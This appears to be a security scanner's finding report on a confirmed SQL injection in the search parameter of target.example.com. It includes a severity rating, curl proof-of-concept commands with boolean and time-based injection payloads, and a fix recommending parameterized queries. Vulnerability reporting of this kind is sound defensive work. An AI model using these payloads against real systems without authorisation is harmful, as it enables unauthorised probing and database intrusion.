Findings / target.example.com / SNMK-2026-0001

SQL Injection in search parameter

Severity High CVSS 8.6 CWE-89 Confidence Confirmed Status Open

Summary

The q parameter on /search is vulnerable to SQL injection. SNMK confirmed it two ways — a boolean-differential test and a time-based test — so this is not a guess. No data was extracted; the check is non-destructive.

Proof of concept (reproduce)

# boolean-differential — these two return different pages curl "https://target.example.com/search?q=test' AND 1=1-- -" # 200, results shown curl "https://target.example.com/search?q=test' AND 1=2-- -" # 200, no results # time-based — response delayed ~5s confirms injection curl "https://target.example.com/search?q=test'; WAITFOR DELAY '0:0:5'-- -"

Recommended fix

Use parameterized queries

Replace string-built SQL with a prepared statement / parameter binding so user input is never concatenated into the query. Add input validation on q and a least-privilege DB account as defense in depth.
